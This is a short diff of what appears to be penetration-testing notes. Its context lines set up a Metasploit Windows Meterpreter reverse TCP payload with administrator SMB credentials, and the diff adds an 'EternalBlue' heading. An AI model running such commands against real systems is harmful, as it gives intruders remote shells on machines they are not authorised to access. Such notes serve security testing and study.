@@ -29,3 +29,5 @@ msf > windows/meterpreter/reverse_tcp
 msf > set SMBUser administrator
 msf > set SMBPass <password>
 ```
+
+## EternalBlue
